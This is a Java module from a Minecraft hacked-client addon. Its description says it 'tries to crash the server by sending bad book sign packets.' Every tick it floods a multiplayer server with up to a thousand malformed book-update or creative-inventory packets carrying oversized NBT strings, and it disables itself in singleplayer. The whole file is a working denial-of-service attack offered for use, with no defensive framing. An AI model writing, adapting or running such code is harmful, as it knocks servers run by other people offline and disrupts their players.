package com.crystaldevs.crystal.modules.crash;

import com.crystaldevs.crystal.CrystalAddon;
import com.crystaldevs.crystal.utils.mc.McUtils;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.ArrayList;
import java.util.Objects;
import java.util.Optional;

public class BookCrash extends Module {

    private final Setting<Mode> mode;

    private final Setting<Integer> amount;

    private final Setting<Boolean> autoDisable;

    public BookCrash() {
        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY.get(), "Book Crash", "CRYSTAL || Tries to crash the server by sending bad book sign packets.");

        SettingGroup sgGeneral = settings.getDefaultGroup();

        mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
            .name("mode")
            .description("Which type of packet to send.")
            .defaultValue(Mode.BookUpdate)
            .build());

        amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("How many packets to send to the server per tick.")
            .defaultValue(100)
            .min(1)
            .sliderMax(1000)
            .build());

        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build());
    }
    int slot = 5;

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if(!mc.isInSingleplayer()) {
            if (Utils.canUpdate()) {
                int i = 0;
                if (i < amount.get()) {
                    do {
                        sendBadBook();
                        i++;
                    } while (i < amount.get());
                } else {
                    return;
                }
            } else {
                return;
            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    private void sendBadBook() {
        String title = "/stop" + Math.random() * 400;
        String mm255 = RandomStringUtils.randomAlphanumeric(255);

        Mode mode1 = mode.get();
        if (Objects.requireNonNull(mode1) != Mode.BookUpdate) {
            if (mode1 == Mode.Creative) {
                int i = 0;
                do {
                    if (slot <= 36 + 9) {

                        slot++;
                        ItemStack book = new ItemStack(Items.WRITTEN_BOOK, 1);
                        NbtCompound tag = new NbtCompound();
                        NbtList list = new NbtList();

                        int j = 0;
                        do {
                            list.add(NbtString.of("{\"text\":" + RandomStringUtils.randomAlphabetic(200) + "\"}"));
                            j++;
                        } while (j < 99);

                        tag.put("author", NbtString.of(RandomStringUtils.randomAlphabetic(9000)));
                        tag.put("title", NbtString.of(RandomStringUtils.randomAlphabetic(25564)));
                        tag.put("pages", list);
                        book.setNbt(tag);
                        assert mc.player != null;
                        mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(slot, book));
                        i++;
                    } else {
                        slot = 0;
                        return;
                    }
                } while (i < 5);
            }
        } else {
            ArrayList<String> pages = new ArrayList<>();

            int i = 0;
            do {
                pages.add(mm255);
                i++;
            } while (i < 50);

            assert mc.player != null;
            Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new BookUpdateC2SPacket(Objects.requireNonNull(McUtils.getInventory()).selectedSlot, pages, Optional.of(title)));
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!autoDisable.get()) {
            return;
        }
        toggle();
    }

    public enum Mode {
        BookUpdate,
        Creative
    }
}
